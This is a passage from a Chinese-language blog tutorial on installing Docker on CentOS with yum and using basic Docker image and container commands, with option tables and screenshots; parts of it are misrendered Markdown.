<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502143309359.png" alt="image-20200502143309359"></p>
<p>第三步，当Docker的版本较低需要升级时，先卸载旧版本在下载新版本。卸载旧版本时需要旧版本Docker的全名(包含版本号)。查看Docker安装包列表的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看Docker安装包列表</span><br><span class="line">yum list installed | grep docker</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502143658919.png" alt="image-20200502143658919"></p>
<p>然后使用安装包的名称删除Docker，命令如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用安装包的名称删除Docker</span><br><span class="line">sudo yum -y remove docker-ce.x86_64</span><br></pre></td></tr></table></figure>

<p>安装包删除完成后，可以通过查看版本号的命令判断是否删除成功</p>
<p>最后使用Docker安装新版本，即可实现Docker版本的更新。</p>
<p>由于Docker在Linux的CentOS操作系统中使用量最大，尽管使用yum进行Docker 的安装相较于使用脚本安装有些复杂，但不可否认的是，使用yum进行安装是一个不错的 选择，可通过以下几个步骤实现Docker在CentOS中的环境安装。</p>
<p>第一步，与使用脚本安装相同，需要进行内核版本的检测。</p>
<p>第二步，安装系统工具，为Docker安装做准备，命令如下</p>
<p><code>sudo yum install -y yum-utils device-mapper-persistent-data lvm2</code> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144355481.png" alt="image-20200502144355481"></p>
<p>第三步，安装软件源信息，命令如下所示</p>
<p><code>sudo yum-config-manager -add-repo https://download.docker.com/linux/centos/dock
er-ce.repo</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144512407.png" alt="image-20200502144512407"></p>
<p>第四步，更新yum缓存</p>
<p><code>sudo yum makecache fast</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144713035.png" alt="image-20200502144713035"></p>
<p>第五步，查看仓库中包含的Docker版本，选择特定版本安装</p>
<p><code>yum list docker-ce —showduplicates | sort -r</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144751935.png" alt="image-20200502144751935"></p>
<p>第六步，使用yum进行Docker的安装</p>
<p><code>sudo yum install docker-ce</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144832069.png" alt="image-20200502144832069"></p>
<p>如果想安装指定的版本</p>
<p><code>sudo yum install docker-ce-17.12.0.ce</code></p>
<p>第七步，启动Docker服务</p>
<p><code>sudo systemctl start docker</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144915810.png" alt="image-20200502144915810"></p>
<p>第八步，启动Docker服务后，可以通过查看Docker版本信息确保服务正常运行。</p>
<p><code>docker version</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144958027.png" alt="image-20200502144958027"></p>
<p>第九步，测试Docker,并输出”hello world</p>
<p><code>docker run hello-world</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200504203403129.png" alt="image-20200504203403129"></p>
<p>Docker安装完成</p>
<h4 id="Docker镜像使用"><a href="#Docker镜像使用" class="headerlink" title="Docker镜像使用"></a>Docker镜像使用</h4><p>Docker镜像操作</p>
<p>在Docker中，镜像是必不可少的，是创建Docker容器的基础。Docker提供了很多用于镜像操作的命令，包含镜像的查找、构建、删除等。</p>
<h5 id="docker和虚拟机的特点"><a href="#docker和虚拟机的特点" class="headerlink" title="docker和虚拟机的特点"></a>docker和虚拟机的特点</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200504204423978.png" alt="image-20200504204423978"></p>
<h4 id="docker的常用命令"><a href="#docker的常用命令" class="headerlink" title="docker的常用命令"></a>docker的常用命令</h4><h5 id="docker帮助命令"><a href="#docker帮助命令" class="headerlink" title="docker帮助命令"></a>docker帮助命令</h5><p>docker version    查看信息</p>
<p>docker info    查看详细信息</p>
<p>docker –help    帮助命令</p>
<p>uname -r     查看内核版本</p>
<h5 id="镜像操作命令"><a href="#镜像操作命令" class="headerlink" title="镜像操作命令"></a>镜像操作命令</h5><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>docker pull</td>
<td>拉去镜像</td>
</tr>
<tr>
<td>docker images</td>
<td>查看镜像信息</td>
</tr>
<tr>
<td>docker tag</td>
<td>设置镜像标签</td>
</tr>
<tr>
<td>docker search</td>
<td>查找镜像</td>
</tr>
<tr>
<td>docker rmi</td>
<td>删除镜像</td>
</tr>
<tr>
<td>docker save</td>
<td>导出镜像</td>
</tr>
<tr>
<td>docker load</td>
<td>载入镜像</td>
</tr>
<tr>
<td>docker push</td>
<td>上传镜像</td>
</tr>
</tbody></table>
<h5 id="（1）-docker-pull-下载镜像"><a href="#（1）-docker-pull-下载镜像" class="headerlink" title="（1） docker pull    下载镜像"></a>（1） docker pull    下载镜像</h5><p>在 Docker中，没有镜像容器无法被启动。通过“docker pull”命令即可实现镜像的拉去。“docker pull”命令包含的部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>拉去所有lagged镜像</td>
</tr>
<tr>
<td>-disable-content-trust</td>
<td>忽略</td>
</tr>
</tbody></table>
<p>目前，镜像可以从以下两个地方拉取。</p>
<p>查看当前存在什么镜像</p>
<p><code>docker images</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507143927966.png" alt="image-20200507143927966"></p>
<p>① 从Docker Hub(官方仓库)中拉取镜像。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 拉取ubuntu镜像</span><br><span class="line">docker pull ubuntu</span><br><span class="line">&#x2F;&#x2F; docker pull ubuntu:TAG ，如果省略TAG拉取的就是最新版，当然也可以定义TAG版本</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 比如将TAG写成3.2也就是也就是拉取的是ubuntu3.2版本</span><br><span class="line">docker pull ubuntu:3.2</span><br></pre></td></tr></table></figure>

<p>对Docker镜像来说，当不指定标签时，默认下载最新的版本“latest”标签。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507144041297.png" alt="image-20200507144041297"></p>
<p>使用<code>docker images</code>查看是否已经拉取成功ubuntu</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507144141141.png" alt="image-20200507144141141"></p>
<p>② 从私有仓库中拉取镜像，需要使用镜像的完整路径。</p>
<p><code>docker pull 192.168.1.101:5000/public/ubuntu:14.04</code></p>
<h5 id="2-docker-images-查看镜像信息"><a href="#2-docker-images-查看镜像信息" class="headerlink" title="(2) docker images     查看镜像信息"></a>(2) docker images     查看镜像信息</h5><p>​        “docker images”是查看镜像信息的命令，可以将本地主机上已有镜像的基本信息全部 列出来，还可以用于判断镜像是否拉取成功。在使用”dockerimages”命令查看镜像信息时, 可以通过加入一些参数实现条件查询</p>
<p>“docker images”命令包含的部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>列出本地所有的镜像(含中间影响层，在默认情况下过滤掉中间映像层)</td>
</tr>
<tr>
<td>–digests</td>
<td>显示镜像的摘要信息</td>
</tr>
<tr>
<td>-f</td>
<td>显示满足条件的镜像</td>
</tr>
<tr>
<td>–format</td>
<td>指定返回值的模块文件</td>
</tr>
<tr>
<td>–no-trunc</td>
<td>显示完整的镜像信息</td>
</tr>
<tr>
<td>-q</td>
<td>只显示镜像的ID</td>
</tr>
</tbody></table>
<p>使用“docker images”查询镜像信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看全部镜像的基本信息</span><br><span class="line">docker images</span><br><span class="line">&#x2F;&#x2F; 查看镜像的摘要信息</span><br><span class="line">docker images --digests</span><br><span class="line">&#x2F;&#x2F; 查看镜像的完整信息</span><br><span class="line">docker images --no-trunc</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507140519678.png" alt="image-20200507140519678"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 只显示镜像的ID</span><br><span class="line">docker images -q</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507140812722.png" alt="image-20200507140812722"></p>
<p>使用“docker images”命令查看到的基本信息字段及其代表的意义</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>REPOSITORY</td>
<td>来自哪个仓库</td>
</tr>
<tr>
<td>TAG</td>
<td>镜像标签信息</td>
</tr>
<tr>
<td>IMAGE ID</td>
<td>镜像的ID，是镜像的唯一表示。ID相同，说明两个镜像目前指向同一个镜像</td>
</tr>
<tr>
<td>GREATED</td>
<td>镜像的创建时间</td>
</tr>
<tr>
<td>SIZE</td>
<td>镜像的大小</td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200506200553254.png" alt="image-20200506200553254"></p>
<h5 id="（3）docker-tag-设置标签"><a href="#（3）docker-tag-设置标签" class="headerlink" title="（3）docker tag    设置标签"></a>（3）docker tag    设置标签</h5><p>“docker tag”命令主要用于设置镜像标签。当一个镜像被使用时，如果另一个项目同样需要使用这个镜像，为了区分镜像主要针对哪个项目，可以通过设置镜像标签来解决这个问题。</p>
<p><code>docker tag cenots centos01</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502195909779.png" alt="image-20200502195909779"></p>
<h5 id="（4）docker-search-查看镜像版本"><a href="#（4）docker-search-查看镜像版本" class="headerlink" title="（4）docker search    查看镜像版本"></a>（4）docker search    查看镜像版本</h5><p>“docker search”命令用于查找镜像。当想拉去一个镜像，却不知道有什么版本时，可以使用查找镜像的命令。在查找镜像时，先从本地查找，然后是本地仓库，最后Docker Hub仓库。</p>
<p>“docker search”命令包含的部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>–automated</td>
<td>只列出automated build类型的镜像</td>
</tr>
<tr>
<td>–no-trunc</td>
<td>显示完整的镜像描述</td>
</tr>
<tr>
<td>-s</td>
<td>累出收藏数不小于指定值的镜像</td>
</tr>
</tbody></table>
<p>使用“docker search”命令查找centos的相关镜像</p>
<p><code>docker search centos</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502195448035.png" alt="image-20200502195448035"></p>
<p>查找tomcat相关镜像</p>
<p><code>docker search tomcat</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507141105236.png" alt="image-20200507141105236"></p>
<p>加上-s筛选收藏度大于等于30的镜像</p>
<p><code>docker search -s 30 tomcat</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507142545457.png" alt="image-20200507142545457"></p>
<p>显示完整说明</p>
<p><code>docker search -s 30 --no-trunc comcat</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507143030170.png" alt="image-20200507143030170"></p>
<h5 id="（5）docker-rmi-删除镜像"><a href="#（5）docker-rmi-删除镜像" class="headerlink" title="（5）docker rmi    删除镜像"></a>（5）docker rmi    删除镜像</h5><p>“docker rmi”命令用于删除镜像。docker中，删除镜像有两种方法：一种是使用镜像的ID删除，另一种是使用仓库名称和标签名称的组合删除。</p>
<p>使用“docker rmi”命令只能删除不处于工作状态的镜像,如果删除运行容器的镜像, Docker会提示有容器正在运行,无法删除。</p>
<p>如果想删除这个镜像，有两种方式:第一种是使用强行删除命令,只需在删除命令中添 加“-f”参数即可;第二种是先删除依赖的所有容器，再使用删除命令。 </p>
<p>“docker rmi” 命令包含的部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-f</td>
<td>强制删除</td>
</tr>
<tr>
<td>-no-prune</td>
<td>不移除镜像的过程镜像，默认移除</td>
</tr>
</tbody></table>
<p>加参数-f是 <strong>删除单个镜像id</strong></p>
<p>之前有的镜像</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507144944574.png" alt="image-20200507144944574"></p>
<p>使用“ docker rmi”命令删除镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除ID为“hello-world”的镜像</span><br><span class="line">docker rmi hello-world</span><br></pre></td></tr></table></figure>

<p>报错了，必须强制，也就是让我们强制删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507145153748.png" alt="image-20200507145153748"></p>
<p>使用<code>docker rmi -f hello-world</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507145302970.png" alt="image-20200507145302970"></p>
<p><strong>删除多个镜像id</strong></p>
<p>查看当前镜像</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507150016628.png" alt="image-20200507150016628"></p>
<p>进行多个删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507150120363.png" alt="image-20200507150120363"></p>
<p>如果是想要将其全部删除</p>
<p>使用<code>docker rmi -f $(docker images -qa)</code>这个命令删除全部镜像</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507151341283.png" alt="image-20200507151341283"></p>
<h5 id="（6）docker-save"><a href="#（6）docker-save" class="headerlink" title="（6）docker save"></a>（6）docker save</h5><p>“docker save”命令主要用于导出镜像。使用“docker save”命令加入“-o”参数即可将镜 像以压缩文件的形式导出到本地，之后如果想分享该镜像，只需复制压缩文件即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">〃导岀“ubuntu:Iatest”镜像,“-o”参数表示输出到的文件</span><br><span class="line">docker save -o ubuntu latest.tar ubuntu:latest</span><br></pre></td></tr></table></figure>

<h5 id="（7）docker-load"><a href="#（7）docker-load" class="headerlink" title="（7）docker load"></a>（7）docker load</h5><p>“docker load”是载入镜像命令。导出镜像是将镜像拿出来，而载入镜像是将镜像放进 去。通过载入镜像命令，导出的压缩文件可以再次导入本地镜像中。</p>
<p>“docker load”命令包 含的部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>–input,-i</td>
<td>从tar压缩文件中读取</td>
</tr>
<tr>
<td>–quiet,-q</td>
<td>抑制负载输出</td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502195605857.png" alt="image-20200502195605857"></p>
<p>使用“ docker load ”命令载入镜像。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 载入&quot;ubuntu_latest.tar&quot;镜像 </span><br><span class="line">docker load —input ubuntu_latest.tar</span><br></pre></td></tr></table></figure>

<p>为了更直观地看到效果，先将”ubuntu:latest”镜像删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502195631583.png" alt="image-20200502195631583"></p>
<p>然后运行载入镜像命令</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502195649107.png" alt="image-20200502195649107"></p>
<p>（8）docker push</p>
<p>“docker push”命令用于上传镜像，可以将本地镜像上传到仓库中,在默认情况下会将镜 像上传到Docker Hub官方仓库。</p>
<h4 id="Docker容器操作"><a href="#Docker容器操作" class="headerlink" title="Docker容器操作"></a>Docker容器操作</h4><h5 id="1、Docker容器简介"><a href="#1、Docker容器简介" class="headerlink" title="1、Docker容器简介"></a>1、Docker容器简介</h5><p>Docker容器是一个开源的容器引擎，允许开发人员将应用以及依赖项打包到一个可移植的容器中，然后发布到任何运行的linux上。容器采用沙箱机制，彼此没有任何借口，很容易在及其和数据中心运行。最重要的是，他们不依赖于任何语言、框架(包括系统)。</p>
<p>虽然Docker容器与其他容器技术相似，但Docker是将关键的应用程序组件捆绑在一个容器中，允许容器在不同的平台和云计算之间移植，因此Docker容器是需要跨多个不同的环境运行的应用程序的理想选择。</p>
<p><strong>注意：</strong>容器由创建时给出的镜像和配置项定义，当容器被删除是，其所有未被持久存储的状态变化都会丢失。</p>
<h5 id="2、Docker容器操作"><a href="#2、Docker容器操作" class="headerlink" title="2、Docker容器操作"></a>2、Docker容器操作</h5><p>​        在Docker中，容器与镜像在结构上大致相同，基本操作也相差不大，唯一的不同就是镜像可以直接拉取，而容器需要创建。</p>
<p>容器的相关命令</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>docker create</td>
<td>创建容器</td>
</tr>
<tr>
<td>docker ps</td>
<td>查看容器信息</td>
</tr>
<tr>
<td>docker start</td>
<td>启动容器</td>
</tr>
<tr>
<td>docker run</td>
<td>创建并启动容器</td>
</tr>
<tr>
<td>docker stop</td>
<td>停止容器</td>
</tr>
<tr>
<td>docker restart</td>
<td>重启容器</td>
</tr>
<tr>
<td>docker rm</td>
<td>删除容器</td>
</tr>
<tr>
<td>docker export</td>
<td>导出容器</td>
</tr>
<tr>
<td>docker import</td>
<td>导入容器</td>
</tr>
<tr>
<td>docker commit</td>
<td>创建新镜像</td>
</tr>
<tr>
<td>docker cp</td>
<td>在容器和本地文件之间复制文件/文件夹</td>
</tr>
</tbody></table>
<p>在使用容器之前，需要事先拉取镜像，如果没有拉取镜像就直接使用，会默认从Docker官方镜像仓库中加载，然后才能通过以上的相关命令实现容器的操作。</p>
<h5 id="新建并启动容器"><a href="#新建并启动容器" class="headerlink" title="新建并启动容器"></a>新建并启动容器</h5><h5 id="docker-run-运行容器"><a href="#docker-run-运行容器" class="headerlink" title="docker run    运行容器"></a>docker run    运行容器</h5><ul>
<li><p>OPTIONS：选项参数</p>
<ul>
<li><pre><code>--name=&quot;容器新名字&quot;：为容器指定一个名称
-d：后台运行容器，并返回容器ID，也即启动守护式容器；
-i：以交互模式运行容器，通常与与-t同时使用；可以理解为(我登录进docker里面这个centos容器以后，要跟你交互)
-t：为容器重新分配一个伪输入重点，通常与-i同时使用。可以理解为（登录进去后弹出一个可以输入命令的伪终端）
-P：随机端口映射；
-p：指定端口映射，有以下四种格式
    ip:hostPort:containerPort
    ip::containerPort
    hostPort:containerPort
    containerPort
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- IMAGE：镜像</span><br><span class="line">- COMMAND：命令</span><br><span class="line"></span><br><span class="line">&#96;docker run [OPTIONS] IMAGE [COMMAND] [ARG...]&#96;</span><br><span class="line"></span><br><span class="line">例如运行centos，如果本地有centos镜像就直接新建运行，如果本地没有centos那就会拉取新建运行</span><br><span class="line"></span><br><span class="line">先不加--name</span><br></pre></td></tr></table></figure>
// 生成了实例，并登陆到了docker里面的centos
docker run -it [IMAGE ID]
</code></pre></li>
</ul>
</li>
</ul>
<p>docker交互运行要有一个控制台，linux控制台一般都在bin下面的。默认进入bash<br>docker run -it centos /bin/bash</p>
<p>可以看到以下图面之前的命令行提示符是还在之前的宿主机里面，使用docker run命令后变成了a97229a12b57，意思就是登陆了docker中的centos了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20200507164617143](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507164617143.png)</span><br><span class="line"></span><br><span class="line">![image-20200707143114453](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200707143114453.png)</span><br><span class="line"></span><br><span class="line">使用&#96;--name&#96;参数进行重命名</span><br><span class="line"></span><br><span class="line">&#96;docker run -it --name mycentos1 centos&#96;</span><br><span class="line"></span><br><span class="line">![image-20200507173747984](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507173747984.png)</span><br><span class="line"></span><br><span class="line">##### 退出容器</span><br><span class="line"></span><br><span class="line">exit：容器停止退出</span><br><span class="line"></span><br><span class="line">ctrl+p+q：离开容器，但不停止</span><br><span class="line"></span><br><span class="line">使用&#96;ctrl+p+q&#96;离开容器但是并不是关闭</span><br><span class="line"></span><br><span class="line">在使用&#96;docker ps&#96;可以看到STATUS前面是UP</span><br><span class="line"></span><br><span class="line">![image-20200507185047248](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507185047248.png)</span><br><span class="line"></span><br><span class="line">##### docker create	创建容器</span><br><span class="line"></span><br><span class="line">“docker create”命令用来创建容器。创建容器时，只需要在“docker create”命令后面加上镜像的名称和标记即可，但使用“docker create”命令创建的容器是处于静止状态的。</span><br><span class="line"></span><br><span class="line">“docker create”命令包含的部分参数</span><br><span class="line"></span><br><span class="line">| 参数              | 描述                                                        |</span><br><span class="line">| ----------------- | ----------------------------------------------------------- |</span><br><span class="line">| -a stdin          | 指定标准输入输出内容类型，可选STDIN、STDOUT、STDERR三项之一 |</span><br><span class="line">| -d                | 后台运行容器，并返回容器的ID                                |</span><br><span class="line">| -i                | 以交互模式运行容器，通常与-t同时使用                        |</span><br><span class="line">| -t                | 为容器重新分配一个伪输入终端，通常与-i同时使用              |</span><br><span class="line">| --name&#x3D;&quot;nginx-lb&quot; | 为容器指定一个名称                                          |</span><br><span class="line">| --volume，-v      | 绑定一个卷                                                  |</span><br><span class="line">| --volume-driver   | 容器的可选卷驱动程序                                        |</span><br><span class="line">| --volumes-from    | 从指定容器装载卷                                            |</span><br><span class="line">| --publish，-p     | 将容器的端口发布到主机                                      |</span><br><span class="line">| --publish-all，-P | 将所有公开的端口发布到随机端口。                            |</span><br><span class="line">| --network         | 将容器连接到网络                                            |</span><br><span class="line">| --link            | 添加链接到另一个容器                                        |</span><br><span class="line">| --ip              | IPv4地址                                                    |</span><br><span class="line">| --detach，-d      | 在后台运行容器并打印容器的ID                                |</span><br><span class="line"></span><br><span class="line">使用“docker create”命令常见容器</span><br></pre></td></tr></table></figure>
<p>//“it”参数为”-i”和”-t”的组合<br>docker create -it ubuntu:latest</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### docker ps	查看容器信息</span><br><span class="line"></span><br><span class="line">“docker ps”是查看容器信息的命令，可以将所有容器的相关信息以列表的形式显示出来，包含容器的名称、ID等信息。单纯地使用“docker ps”命令可以查看当前正在运行的相关容器信息；如果想针对不同的情况去查询相关容器，可以再“docker ps”命令后加一些参数</span><br><span class="line"></span><br><span class="line">可以使用exit退出容器</span><br><span class="line"></span><br><span class="line">OPTIONS说明（常用）</span><br><span class="line"></span><br><span class="line">- -a：列出当前所有正在运行的容器+历史上运行过的</span><br><span class="line">- -i：显示最近创建的容器。</span><br><span class="line">- -n：显示最近n个创建的容器。</span><br><span class="line">- -q：静默模式，只显示容器编号。</span><br><span class="line">- --no-trunc：不截断输出</span><br><span class="line"></span><br><span class="line">“docker ps [OPTIONS]”命令包含的常用参数</span><br><span class="line"></span><br><span class="line">| 参数       | 描述                                      |</span><br><span class="line">| ---------- | ----------------------------------------- |</span><br><span class="line">| -a         | 列出当前所有正在运行的容器+历史上运行过的 |</span><br><span class="line">| -f         | 根据条件过滤显示的内容                    |</span><br><span class="line">| --format   | 指定返回的模板文件                        |</span><br><span class="line">| -l         | 显示最近创建的容器                        |</span><br><span class="line">| -n         | 列出最近创建的n个容器                     |</span><br><span class="line">| --no-trunc | 不截断输出                                |</span><br><span class="line">| -q         | 静默模式，只显示容器的编号                |</span><br><span class="line">| -s         | 显示总的文件大小                          |</span><br><span class="line"></span><br><span class="line">使用“docker ps参数查看docker运行的进程</span><br></pre></td></tr></table></figure>
<p>docker ps</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20200507170424573](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507170424573.png)</span><br><span class="line"></span><br><span class="line">使用&#96;docker ps -a&#96;显示所有容器，包括未运行的容器</span><br><span class="line"></span><br><span class="line">![image-20200507172414774](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507172414774.png)</span><br><span class="line"></span><br><span class="line">使用“docker ps -a”命令查看到的基本信息字段及其代表的意义</span><br><span class="line"></span><br><span class="line">| 字段          | 意义        |</span><br><span class="line">| ------------- | ----------- |</span><br><span class="line">| CONTAINER  ID | 容器的ID    |</span><br><span class="line">| IMAGE         | 镜像的名称  |</span><br><span class="line">| COMMAND       | command命令 |</span><br><span class="line">| CREATED       | 创建时间    |</span><br><span class="line">| STATUS        | 容器的状态  |</span><br><span class="line">| PORTS         | 端口号      |</span><br><span class="line">| NAMES         | 容器的名称  |</span><br><span class="line"></span><br><span class="line">使用&#96;docker ps -lq&#96;只显示容器编号</span><br><span class="line"></span><br><span class="line">![image-20200507171836778](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507171836778.png)</span><br><span class="line"></span><br><span class="line">##### docker start	开启容器</span><br><span class="line"></span><br><span class="line">使用docker start将没开启的容器进行开启，开启之后STATUS就会在前面加上UP</span><br><span class="line"></span><br><span 